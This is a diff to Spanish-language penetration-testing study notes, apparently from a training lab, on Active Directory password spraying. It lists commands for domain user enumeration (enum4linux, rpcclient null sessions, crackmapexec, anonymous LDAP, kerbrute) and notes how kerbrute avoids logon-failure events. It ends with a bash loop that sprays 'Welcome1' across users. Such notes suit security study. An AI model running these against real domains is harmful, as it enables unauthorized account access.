@@ -67,6 +67,10 @@ Con la tecla esc se puede salir de la consola y tipear HELP para que se nos mues
 	### Password spraying
 Consta del intento de loguearse a un servicio mediante el uso de una contraseña pero una larga lista de usuarios
 
+Para realizar este ataque correctamente priomero se necesita:
+-> Listado valido de usuarios de dominio
+-> Poliotica de contraseñas de la empresa
+   
 ## Obtener politica de contraseñas Linux
 crackmapexec smb 172.16.5.5 -u <usuario valido> -p <contraseña valida> --pass-pol
 #Enumeracion de politica de contraseñas con credenciales validas
@@ -90,3 +94,31 @@ net accounts
 import-module .\PowerView.ps1
 Get-DomainPolicy
 #Lo mismo que mas arriba pero con powershell
+
+## Obtener usuarios validos de dominio
+enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
+#Enumeracion dede usarios mediante tool enum4linux y flag -U
+
+rpcclient -U "" -N 172.16.5.5
+enumdomusers
+#Con sesion null se puede consultar con la anteior query
+
+crackmapexec smb 172.16.5.5 --users
+#Crackmapexec tiene su metodo con la flag --user para darnos info de ellos
+#Tambien nos devuelve info acerca de cantidad de invalid logins (badpwdcount), la vez en la que este bad attemp fue realizado (baddpwdtime) y las veces que se fallo (badpwdcount)
+
+ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
+#Intentando obtener inforrmacion de usuarios mediante LDAP anonymous
+
+./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
+#Parecido a ldapsearch. Ekemplo con null session
+
+kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
+#Utiliza kerberos preauth el cual es rapido para realizar consultas. Este metodo no genera un windows event ID or logon failure que puede ser (y generalmente es) controlado.
+#El tool envia un TGT request al dominio sin kerberos preauth para enumerar los usuarios. Si el KDC rresponder con un error PRINCIPAL UNKNOWN el usuario es invalido mientras que si devuelve un kerberos preeauth significa que es valido
+#Si bien no genere windows ID event, el uso de kerbrute generaria un evento de request de TGT en el caso de que "Kerberos event logging" este habilitado
+
+----------  ----------  ----------  ----------
+	### Internal Password Spraying - from Linux
+for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
+#
